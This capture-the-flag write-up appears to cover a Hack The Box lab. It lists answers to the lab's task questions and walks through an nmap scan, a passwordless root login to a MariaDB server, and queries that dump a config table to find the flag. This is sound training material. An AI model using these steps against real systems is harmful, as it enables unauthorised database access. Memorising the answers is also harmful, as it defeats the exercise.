## 1. Questions
- Task 1
	- During our scan, which port do we find serving MySQL?
		- `3306`
- Task 2
	- What community-developed MySQL version is the target running?
		- `MariaDB`
- Task 3
	- When using the MySQL command line client, what switch do we need to use in order to specify a login username?
		- `-u`
- Task 4
	- Which username allows us to log into this MariaDB instance without providing a password?
		- `root`
- Task 5
	- In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?
		- `*`
- Task 6
	- In SQL, what symbol do we need to end each query with?
		- `;`
- Task 7
	- There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host?
		- `htb`
- Submit Flag
	- Submit root flag
## 2. Tools Used
- Linux
- CLI
- nmap
- mysql
## 3. Approach
### nmap scan
- Useful resource
	- https://www.stationx.net/nmap-cheat-sheet/
```bash
sudo nmap -sSVC -Pn -n --disable-arp-ping -T4 10.129.95.232
```
- Flags
	- `-sSVC` - SYN, service, and default sript scan.
	- `-Pn` - Exclude ICMP scanning.
	- `-n` - Exclude name resolution.
	- `--disable-arp-ping` - Exclude `arp` scanning.
	- `-T4` - Use speed template `aggressive`.
- Result
```bash
<snip>
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 66
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, IgnoreSigpipes, Speaks41ProtocolNew, LongColumnFlag, SupportsTransactions, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, ConnectWithDatabase, FoundRows, InteractiveClient, IgnoreSpaceBeforeParenthesis, ODBCClient, SupportsCompression, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: ,ZaWrYG8$Fu<hv<dcFq*
|_  Auth Plugin Name: mysql_native_password
<snip>
```
### Research common mysql credentials
- https://hackviser.com/tactics/pentesting/services/mysql#default-credentials
- https://hackviser.com/tactics/pentesting/services/mysql#common-credentials
### Test mysql server connection (passwordless)
- Test usernames
	- `root`
	- `admin`
	- `administrator`
	- `user`
	- `test`
- Successfully connected using username `root`
```bash
mysql -u root -h 10.129.95.232 -P 3306
```
### Explore databases
- Useful resources
	- https://gist.github.com/Jonasdero/b4c8a5e284e13aaf456f44f5dc60257e
```mysql
SHOW DATABASES;
```
- Result
```mysql
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```
### Switch to target database
- Useful resource
	- https://stackoverflow.com/questions/7002100/default-mysql-database-name#:~:text=4%20databases%20in%20MySQL
- Switch to non-standard database
```mysql
USE htb;
```
### Explore tables
- Useful resources
	- https://gist.github.com/Jonasdero/b4c8a5e284e13aaf456f44f5dc60257e
```mysql
SHOW TABLES;
```
- Result
```mysql
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
```
### Explore config table
- Useful resources
	- https://gist.github.com/Jonasdero/b4c8a5e284e13aaf456f44f5dc60257e
```mysql
SELECT * FROM config;
```
- Retrieved flag from result.
```mysql
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | <omitted>                        |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
```
